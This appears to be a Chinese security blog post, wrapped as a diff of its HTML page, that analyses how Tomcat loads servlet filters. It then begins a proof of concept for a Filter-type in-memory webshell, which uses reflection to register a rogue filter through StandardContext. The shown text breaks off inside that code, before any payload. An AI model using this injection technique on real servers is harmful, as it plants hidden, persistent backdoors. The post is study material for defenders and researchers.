@@ -1,0 +1,747 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Lousix">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Java内存马中Tomcat Servlet Filter类型的内存马分析以及PoC">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java 内存马(一)——Filter">
+<meta property="og:url" content="http://blog.lousix.top/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/index.html">
+<meta property="og:site_name" content="星火">
+<meta property="og:description" content="Java内存马中Tomcat Servlet Filter类型的内存马分析以及PoC">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blog.lousix.top/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled.png">
+<meta property="og:image" content="http://blog.lousix.top/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled%201.png">
+<meta property="og:image" content="http://blog.lousix.top/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled%202.png">
+<meta property="og:image" content="http://blog.lousix.top/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled%203.png">
+<meta property="og:image" content="http://blog.lousix.top/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled%204.png">
+<meta property="og:image" content="http://blog.lousix.top/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled%205.png">
+<meta property="og:image" content="http://blog.lousix.top/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled%206.png">
+<meta property="og:image" content="http://blog.lousix.top/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled%207.png">
+<meta property="og:image" content="http://blog.lousix.top/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled%208.png">
+<meta property="og:image" content="http://blog.lousix.top/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled%209.png">
+<meta property="og:image" content="http://blog.lousix.top/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled%2010.png">
+<meta property="og:image" content="http://blog.lousix.top/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled%2011.png">
+<meta property="article:published_time" content="2023-03-31T03:32:04.000Z">
+<meta property="article:modified_time" content="2023-03-31T03:44:27.388Z">
+<meta property="article:author" content="Lousix">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://blog.lousix.top/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled.png">
+  
+  
+  
+  <title>Java 内存马(一)——Filter - 星火</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blog.lousix.top","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"hyVKHtMY47tuwMe8Zz6tIVII-gzGzoHsz","app_key":"e941h2ZJC71w6fXhYNbHZ5l6","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>星火</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Java 内存马(一)——Filter"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-03-31 11:32" pubdate>
+          2023年3月31日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          83 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Java 内存马(一)——Filter</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>Java 内存马分类</p>
+<ul>
+<li>Servlet-Api类<ul>
+<li>Filter型</li>
+<li>Servlet型</li>
+</ul>
+</li>
+<li>SpringBoot<ul>
+<li>拦截器</li>
+<li>Controller</li>
+</ul>
+</li>
+<li>Java Instrumentation类<ul>
+<li>agent</li>
+</ul>
+</li>
+</ul>
+<h1 id="0x01-JavaWeb搭建"><a href="#0x01-JavaWeb搭建" class="headerlink" title="0x01 JavaWeb搭建"></a>0x01 JavaWeb搭建</h1><p>创建javaweb项目，添加一个Filter</p>
+<p>Test.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebFilter(filterName = &quot;Test&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        System.out.println(<span class="hljs-string">&quot;===========&quot;</span> + <span class="hljs-string">&quot;Filter Init&quot;</span> + <span class="hljs-string">&quot;===========&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;===========&quot;</span> + <span class="hljs-string">&quot;Filetr destroy&quot;</span> + <span class="hljs-string">&quot;===========&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        System.out.println(<span class="hljs-string">&quot;++++++++++&quot;</span> + <span class="hljs-string">&quot;Filter doing&quot;</span> + <span class="hljs-string">&quot;++++++++++&quot;</span> );<br>        chain.doFilter(request, response);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>web.xml</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;web-app xmlns=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br>         xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>         xsi:schemaLocation=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><br>         version=<span class="hljs-string">&quot;4.0&quot;</span>&gt;<br>    &lt;filter&gt;<br>        &lt;filter-name&gt;Test&lt;/filter-name&gt;<br>        &lt;filter-class&gt;Test&lt;/filter-class&gt;<br>    &lt;/filter&gt;<br>    &lt;filter-mapping&gt;<br>        &lt;filter-name&gt;Test&lt;/filter-name&gt;<br>        &lt;url-pattern&gt;<span class="hljs-comment">/*&lt;/url-pattern&gt;</span><br><span class="hljs-comment">    &lt;/filter-mapping&gt;</span><br><span class="hljs-comment">&lt;/web-app&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>添加maven</p>
+<p><img src="/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>pom.xml添加依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-catalina --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.58<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>idea2020之后不能直接创建javaWeb，参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/lihaohaocn/article/details/108928199?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1-108928199-blog-127891118.pc_relevant_default&spm=1001.2101.3001.4242.2&utm_relevant_index=4">链接</a></p>
+<p>不能快捷创建servlet和filter，从maven中下载jar包，导入项目即可</p>
+<p><a target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api/4.0.1">https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api/4.0.1</a></p>
+<h1 id="0x02-Tomcat相关"><a href="#0x02-Tomcat相关" class="headerlink" title="0x02 Tomcat相关"></a>0x02 Tomcat相关</h1><h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><p><img src="/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled%201.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<ul>
+<li>TomcatServer：Servlet 的顶层容器，包含一个或多个 Host 子容器；</li>
+<li>Host：虚拟主机，负责 Web 应用的部署和 Context 的创建；</li>
+<li>Context：Web 应用上下文，包含多个Wrapper，负责 Web 配置的解析、管理所有 Web 资源；</li>
+<li>Wrapper：最底层的容器，是对 Servlet 的封装，负责 Servlet 实例的创建、执行和销毁。</li>
+</ul>
+<h2 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h2><h3 id="获取途径"><a href="#获取途径" class="headerlink" title="获取途径"></a>获取途径</h3><p><code>ServletConfig#getServletContext()</code></p>
+<p><code>getServletConfig().getServletContext()</code></p>
+<p><code>GenericServlet#getServletContext()</code></p>
+<p>其中<code>GenericServlet</code> 被<code>HttpServlet</code> 所继承</p>
+<h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>tomcat为每个web项目都创建一个ServletContext实例，tomcat在启动时创建，服务器关闭时销毁，在一个web项目中共享数据，管理web项目资源，为整个web配置公共信息等，通俗点讲，就是一个web项目，就存在一个ServletContext实例，每个Servlet读可以访问到它。</p>
+<p>上面讲到的Context为<code>ApplicationContext</code>、<code>StandardContext</code>等</p>
+<h1 id="0x03-Filter源码分析"><a href="#0x03-Filter源码分析" class="headerlink" title="0x03 Filter源码分析"></a>0x03 Filter源码分析</h1><h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><p>在<code>Test</code>的<code>doFilter</code>处设置断点，开启debug，得到调用链，一部分如下图所示</p>
+<p><img src="/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled%202.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<h2 id="Filter调用过程"><a href="#Filter调用过程" class="headerlink" title="Filter调用过程"></a>Filter调用过程</h2><h3 id="ApplicationFilterChain"><a href="#ApplicationFilterChain" class="headerlink" title="ApplicationFilterChain"></a>ApplicationFilterChain</h3><p>我们根据调用链反着来看</p>
+<p><code>Test</code>中<code>doFilter</code>方法是在<code>ApplicationFilterChain</code>中调用的</p>
+<p><img src="/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled%203.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>此处的<code>filter</code> 来自于<code>ApplicationFilterChain</code>类中定义的<code>filters</code>数组</p>
+<p><img src="/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled%204.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>根据<code>ApplicationFilterChain</code> 类的定义，我们可以发现<code>filters</code>实际上为一个空的数组。</p>
+<p><img src="/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled%205.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>那么我们在<code>ApplicationFilterChain</code> 中查找与<code>filters</code>相关操作——<code>addFilter</code> 方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">addFilter</span><span class="hljs-params">(ApplicationFilterConfig filterConfig)</span> &#123;<br>    ApplicationFilterConfig[] newFilters = <span class="hljs-built_in">this</span>.filters;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> newFilters.length;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var4 &lt; var3; ++var4) &#123;<br>        <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> newFilters[var4];<br>        <span class="hljs-keyword">if</span> (filter == filterConfig) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.n == <span class="hljs-built_in">this</span>.filters.length) &#123;<br>        newFilters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>[<span class="hljs-built_in">this</span>.n + <span class="hljs-number">10</span>];<br>        System.arraycopy(<span class="hljs-built_in">this</span>.filters, <span class="hljs-number">0</span>, newFilters, <span class="hljs-number">0</span>, <span class="hljs-built_in">this</span>.n);<br>        <span class="hljs-built_in">this</span>.filters = newFilters;<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.filters[<span class="hljs-built_in">this</span>.n++] = filterConfig;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="StandardWrapperValve"><a href="#StandardWrapperValve" class="headerlink" title="StandardWrapperValve"></a>StandardWrapperValve</h3><p>接下来，看到<code>StandardWrapperValve</code> 类的<code>invoke</code> 方法，可以发现此处实例化了一个<code>ApplicationFilterChain</code> </p>
+<p><img src="/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled%206.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<h3 id="ApplicationFilterFactory"><a href="#ApplicationFilterFactory" class="headerlink" title="ApplicationFilterFactory"></a>ApplicationFilterFactory</h3><p>跟进<code>createFilterChain</code> 方法，可以找到两处调用<code>addFilter</code> 方法的代码</p>
+<p><img src="/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled%207.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p><img src="/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled%208.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>这两处代码主要是利用<code>matchFiltersURL</code> 方法对<code>web.xml</code>进行解析，判断<code>web.xml</code>中的内容是否正确，符合配置要求，对于符合配置的添加到<code>filterChain</code>中</p>
+<h3 id="Filter载入方法"><a href="#Filter载入方法" class="headerlink" title="Filter载入方法"></a>Filter载入方法</h3><p><code>filterDefs</code> 、<code>filterMaps</code>和<code>filterConfig</code> 都是由调用<code>StandardContext</code> 中的方法产生的</p>
+<p><img src="/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled%209.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p><img src="/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled%2010.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p><img src="/2023/03/31/Java%20%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)%E2%80%94%E2%80%94Filter/Untitled%2011.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>最后通过<code>StandardContext</code>的<code>addFilterDef</code>、<code>addFilterMap</code>、<code>filterStart</code>加载到<code>filterchain</code>中调用</p>
+<h1 id="0x04-Filter内存马"><a href="#0x04-Filter内存马" class="headerlink" title="0x04 Filter内存马"></a>0x04 Filter内存马</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Lousix&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">urlPattern</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/lousix&quot;</span>;<br><br><span class="hljs-keyword">try</span>&#123;<br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    <span class="hljs-comment">// ServletContext servletContext = request.getSession().getServletContext();</span><br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br><br>    <span class="hljs-keyword">if</span> (filterConfigs.get(name) == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Filter</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>                <span 